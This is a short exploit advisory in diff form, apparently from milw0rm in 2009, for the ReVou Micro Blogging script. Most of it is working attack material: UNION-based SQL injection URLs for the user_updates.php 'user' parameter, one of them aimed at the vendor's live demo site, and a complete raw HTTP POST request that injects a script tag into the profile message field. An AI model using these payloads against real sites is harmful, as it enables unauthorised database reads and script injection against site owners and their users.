@@ -1,0 +1,56 @@
+#ReVou Micro Blogging SQL/XSS Injection Vulnerability
+
+
+#Author: nuclear
+
+
+#site:
+http://www.revou.com/index.php
+
+
+#SQL vuln:
+http://localhost/[path]/user_updates.php?user=test21' UNION SELECT 1,2,3,4,@@version,6,7,8/*
+
+#demo:
+http://www.revou.com/demo/rss/user_updates.php?user=test21%27%20UNION%20SELECT%201,2,3,4,@@version,6,7,8/*
+
+
+#XSS vuln:
+POST /demo/profile/test HTTP/1.1
+Host: www.revou.com
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://www.revou.com/demo/profile/test
+Cookie: cookieid=c74884b47660610d8bbab35e0605f258; __utma=220501147.1119512335.1233273058.1233273058.1233273058.1; __utmb=220501147; __utmc=220501147; __utmz=220501147.1233273058.1.1.utmccn=(referral)|utmcsr=alstrasoft.com|utmcct=/products.htm|utmcmd=referral; PHPSESSID=02eb3297bbec0b429d06f5a083f55673
+Content-Type: multipart/form-data; boundary=---------------------------3726301281829306375575822139
+Content-Length: 598
+
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name="message"
+
+<script>alert("XSS")</script>
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name="add_photo"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name="user"
+
+test
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name="add_message"
+
+Send
+-----------------------------3726301281829306375575822139--
+
+
+
+#greetz Mi4night, zYzTeM, THE_MAN, Pepe, I-O-W-A, Digitalfortress, DiGitalX, sys32-hack, sys32r, Whitestar
+
+# milw0rm.com [2009-01-30]
